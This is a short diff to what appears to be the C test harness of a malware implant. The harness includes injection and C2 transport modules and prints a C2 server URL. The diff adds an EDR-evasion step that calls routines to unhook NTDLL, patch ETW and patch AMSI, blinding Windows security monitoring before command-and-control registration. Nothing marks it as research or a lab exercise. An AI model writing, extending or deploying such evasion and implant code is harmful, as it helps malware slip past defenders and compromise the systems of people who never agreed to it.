@@ -13,6 +13,7 @@
 #include "crypto.h"
 #include "injection.h"
 #include "transport.h"
+#include "evasion.h"
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -133,6 +134,19 @@ static BOOL TestEncryption(VOID) {
 // Test Phase 3: C2 Registration
 // =============================================
 static BOOL TestC2(VOID) {
+    printf("\n[*] EDR Evasion\n");
+    printf("    [*] Unhooking NTDLL...\n");
+    if (UnhookNtdll()) printf("    [+] NTDLL unhook: OK\n");
+    else printf("    [-] NTDLL unhook: FAILED\n");
+
+    printf("    [*] Patching ETW...\n");
+    if (PatchEtw()) printf("    [+] ETW patch: OK\n");
+    else printf("    [-] ETW patch: FAILED\n");
+
+    printf("    [*] Patching AMSI...\n");
+    if (PatchAmsi()) printf("    [+] AMSI patch: OK\n");
+    else printf("    [-] AMSI patch: FAILED\n");
+
     printf("\n[*] Phase 3: C2 Transport\n");
     printf("    [*] Server: %s\n", C2_SERVER_URL);
 
